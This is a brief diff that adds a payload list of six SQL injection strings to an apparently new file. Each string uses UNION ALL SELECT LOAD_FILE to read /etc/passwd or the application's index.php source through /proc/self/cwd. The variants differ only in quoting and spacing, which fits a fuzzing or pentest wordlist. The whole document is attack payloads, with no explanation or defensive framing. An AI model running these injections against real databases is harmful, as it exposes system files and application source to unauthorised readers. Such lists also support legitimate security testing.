@@ -1,0 +1,7 @@
+' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+' UNION ALL SELECT LOAD_FILE('/proc/self/cwd/index.php') --
+UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+UNION ALL SELECT LOAD_FILE('/proc/self/cwd/index.php') --
+ UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+ UNION ALL SELECT LOAD_FILE('/proc/self/cwd/index.php') --
+
